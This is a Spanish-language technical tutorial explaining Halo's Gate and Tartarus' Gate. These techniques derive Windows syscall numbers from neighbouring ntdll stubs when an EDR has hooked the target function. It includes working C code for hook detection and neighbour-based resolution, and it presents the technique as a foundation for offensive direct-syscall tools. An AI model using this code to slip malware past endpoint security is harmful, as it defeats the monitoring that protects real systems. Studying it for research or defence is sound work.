---
layout: single
title: "Halo's Gate: resolver SSNs cuando ntdll está hooked"
date: 2026-06-17
categories: [tutoriales, malware]
tags: [windows-internals, syscalls, halos-gate, hells-gate, edr, ntdll, hooks, evasion, eat, peb]
excerpt: "Hell's Gate falla cuando un EDR hookea el stub objetivo. Halo's Gate lo resuelve aprovechando que los SSNs son secuenciales por orden de dirección: si el stub está parchado, busca vecinos sin hookear y calcula el SSN por diferencia de posición."
permalink: /tutoriales/halos-gate/
---

[Hell's Gate](/tutoriales/hells-gate-implementacion/) extrae el SSN de los primeros bytes del stub en `ntdll.dll`. Funciona perfectamente cuando el binario no está hooked. Pero en un entorno con EDR activo, los stubs de las funciones más vigiladas tienen sus primeros bytes sobreescritos con un `JMP` — y la comprobación `byte[+3] == 0xb8` falla. Halo's Gate es la extensión que maneja ese caso.

## Qué hace un EDR al hookear un stub

Un stub sin hooks en x64:

```text
offset +0: 4C 8B D1     mov r10, rcx
offset +3: B8 XX XX 00 00  mov eax, <SSN>
offset +8: 0F 05        syscall
offset +A: C3           ret
```

Con un hook de EDR activo, los primeros bytes se sobreescriben con un salto al módulo del EDR:

```text
offset +0: E9 XX XX XX XX  jmp <EDR_hook>
offset +5: 00 00 00 00  (restos del stub original, ahora inaccesibles)
```

El byte en `+0` es `0xe9`. El opcode `0xb8` de `MOV EAX` ya no está — Hell's Gate no puede extraer ningún SSN.

## La propiedad clave: SSNs secuenciales por dirección

Los stubs de `ntdll.dll` están ordenados en memoria por dirección virtual ascendente, y sus SSNs siguen exactamente ese orden. La función con la dirección más baja tiene SSN 0, la siguiente tiene SSN 1, y así sucesivamente. Esto no es accidental — el SSDT es una tabla indexada que el kernel construye en ese mismo orden.

Consecuencia directa: si conoces el SSN de cualquier stub vecino no hooked, y sabes cuántas posiciones de distancia hay entre ese vecino y el stub objetivo, puedes calcular el SSN del objetivo:

```text
SSN_objetivo = SSN_vecino ± distancia
```

Si el vecino está a 2 posiciones por debajo (dirección menor → SSN menor):
`SSN_objetivo = SSN_vecino + 2`

Si el vecino está a 1 posición por encima (dirección mayor → SSN mayor):
`SSN_objetivo = SSN_vecino - 1`

## Construir el orden correcto: EAT ordenada por dirección

Para conocer las posiciones relativas, hay que saber en qué orden están los stubs en memoria. La EAT de ntdll no está necesariamente ordenada por dirección — está ordenada por nombre (para facilitar búsqueda binaria). Hay que construir el orden manual.

El proceso: al traversar la EAT, construir un array de pares `{RVA, índice_en_EAT}` para todas las funciones `Nt*`, ordenarlo por RVA ascendente. El índice en este array ordenado es el SSN relativo. Para pasar de "distancia en el array" a "distancia en SSN" no hace falta conocer los SSNs absolutos — basta saber que son continuos.

```c
typedef struct _SYSCALL_ENTRY {
    PVOID pAddress;
    WORD  wIndex;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// Comparador para qsort
int CompareSyscallEntries(const void* a, const void* b) {
    return (int)((PBYTE)((PSYSCALL_ENTRY)a)->pAddress -
                 (PBYTE)((PSYSCALL_ENTRY)b)->pAddress);
}
```

Una vez ordenado el array, el índice de cada función en él es su SSN. No hace falta leer ningún byte del stub para saber el SSN de una función no hooked — basta con su posición en el array ordenado.

## Detección de hooks y extracción por vecinos

La lógica extendida de `GetVxTableEntry` en Halo's Gate:

```c
BOOL GetVxTableEntryHalo(PVOID pModuleBase,
                         PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
                         PVX_TABLE_ENTRY pVxTableEntry,
                         PSYSCALL_ENTRY pSortedEntries,
                         DWORD dwEntryCount) {
    PDWORD pdwAddressOfFunctions   = (PDWORD)((PBYTE)pModuleBase +
                                     pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames       = (PDWORD)((PBYTE)pModuleBase +
                                     pImageExportDirectory->AddressOfNames);
    PWORD  pwAddressOfNameOrdinals = (PWORD)((PBYTE)pModuleBase +
                                     pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczName       = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFuncAddress  = (PBYTE)pModuleBase +
                              pdwAddressOfFunctions[pwAddressOfNameOrdinals[cx]];

        if (djb2((PBYTE)pczName) != pVxTableEntry->dwHash)
            continue;

        pVxTableEntry->pAddress = pFuncAddress;

        // Caso 1: stub limpio — extracción directa
        if (*((PBYTE)pFuncAddress + 3) == 0xb8) {
            BYTE high = *((PBYTE)pFuncAddress + 5);
            BYTE low  = *((PBYTE)pFuncAddress + 4);
            pVxTableEntry->wSystemCall = (high << 8) | low;
            return TRUE;
        }

        // Caso 2: stub hooked (E9 JMP) — buscar vecinos en array ordenado
        if (*((PBYTE)pFuncAddress) == 0xe9) {
            // Encontrar posición del objetivo en el array ordenado
            DWORD dwTargetIdx = 0;
            for (DWORD i = 0; i < dwEntryCount; i++) {
                if (pSortedEntries[i].pAddress == pFuncAddress) {
                    dwTargetIdx = i;
                    break;
                }
            }

            // Escanear vecinos hacia abajo (SSN menor)
            for (DWORD i = 1; dwTargetIdx >= i; i++) {
                PVOID pNeighbor = pSortedEntries[dwTargetIdx - i].pAddress;
                if (*((PBYTE)pNeighbor + 3) == 0xb8) {
                    BYTE high = *((PBYTE)pNeighbor + 5);
                    BYTE low  = *((PBYTE)pNeighbor + 4);
                    pVxTableEntry->wSystemCall = ((high << 8) | low) + (WORD)i;
                    return TRUE;
                }
            }

            // Escanear vecinos hacia arriba (SSN mayor)
            for (DWORD i = 1; dwTargetIdx + i < dwEntryCount; i++) {
                PVOID pNeighbor = pSortedEntries[dwTargetIdx + i].pAddress;
                if (*((PBYTE)pNeighbor + 3) == 0xb8) {
                    BYTE high = *((PBYTE)pNeighbor + 5);
                    BYTE low  = *((PBYTE)pNeighbor + 4);
                    pVxTableEntry->wSystemCall = ((high << 8) | low) - (WORD)i;
                    return TRUE;
                }
            }
        }

        return FALSE;
    }
    return FALSE;
}
```

El array `pSortedEntries` se construye una sola vez antes de llamar a `GetVxTableEntryHalo` para cada función objetivo. El coste es O(n log n) para el sort, amortizado entre todas las entradas de la tabla.

## Verificación manual del principio de secuencialidad

Para comprobar que los SSNs son realmente secuenciales, basta con WinDbg:

```text
0:000> uf ntdll!NtCreateFile
ntdll!NtCreateFile:
00007fff`b040b8d0  4c8bd1      mov r10,rcx
00007fff`b040b8d3  b855000000  mov eax,55h    ; SSN = 0x55

0:000> uf ntdll!NtCreateIoCompletion
ntdll!NtCreateIoCompletion:
00007fff`b040b900  4c8bd1      mov r10,rcx
00007fff`b040b903  b856000000  mov eax,56h    ; SSN = 0x56
```

`NtCreateIoCompletion` tiene la dirección inmediatamente siguiente a `NtCreateFile` en la EAT ordenada, y su SSN es exactamente `NtCreateFile + 1`. Esa propiedad es la que Halo's Gate explota.

## Caso extremo: varios stubs hooked consecutivos

Si el EDR hookea un bloque de funciones contiguas, el escaneo de vecinos inmediatos también falla. La implementación correcta no para en el primer vecino — itera hasta encontrar uno limpio, incrementando `i` en cada paso. La fórmula `SSN_vecino ± i` sigue siendo válida independientemente de cuántos stubs hooked haya entre el objetivo y el vecino encontrado, siempre que todos los stubs intermedios estén también presentes en el array ordenado.

En la práctica, los EDRs no hookean cientos de funciones consecutivas — los hooks son quirúrgicos sobre las funciones más vigiladas. Un escaneo de radio 10-20 posiciones es suficiente para el 99% de los entornos.

## Tartarus' Gate: hooks en offset distinto

Halo's Gate asume que el hook empieza en `offset +0` (`0xe9` en el primer byte). Algunos EDRs parchean en posición diferente — por ejemplo en `offset +3`, sobreescribiendo directamente el `MOV EAX`:

```text
offset +0: 4C 8B D1     mov r10, rcx    ; intacto
offset +3: E9 XX XX XX XX  jmp <EDR>   ; sobreescribe mov eax
```

Tartarus' Gate extiende la detección a múltiples offsets:

```c
BOOL IsHooked(PVOID pFuncAddress) {
    // Hook en offset 0 (clásico)
    if (*((PBYTE)pFuncAddress) == 0xe9)
        return TRUE;
    // Hook en offset 3 (sobreescribe MOV EAX)
    if (*((PBYTE)pFuncAddress + 3) == 0xe9)
        return TRUE;
    // Hook con MOV indirecto (algunos EDRs más sofisticados)
    if (*((PBYTE)pFuncAddress + 3) == 0x75)
        return TRUE;
    return FALSE;
}
```

La lógica de resolución por vecinos es idéntica — solo cambia cómo se detecta que el stub está comprometido.

## Comparativa: Hell's Gate → Halo's Gate → Tartarus' Gate

| Técnica | Detecta hook | Resuelve hooked | Método |
|---|---|---|---|
| Hell's Gate | No — falla silenciosamente | No | Lee SSN de `byte[+3]==0xb8` |
| Halo's Gate | `byte[0]==0xe9` | Sí — vecinos en EAT ordenada | `SSN_vecino ± distancia` |
| Tartarus' Gate | `0xe9` en offset 0, 3 y otros | Sí | Igual, con detección extendida |

## Conclusión

Halo's Gate convierte el punto de fallo de Hell's Gate en una oportunidad. El hecho de que los SSNs sean secuenciales por dirección — una propiedad estructural del SSDT — significa que hookear un stub no elimina la posibilidad de conocer su SSN: solo obliga a derivarlo desde un vecino. La técnica es robusta mientras haya al menos un stub no hooked en la vecindad, lo que en la práctica siempre se cumple salvo en entornos de análisis extremadamente agresivos.

La combinación Hell's Gate + Halo's Gate cubre los dos casos: stub limpio → extracción directa; stub hooked → resolución por vecinos. Es la base sobre la que se construyen las implementaciones modernas de direct syscalls en herramientas ofensivas.
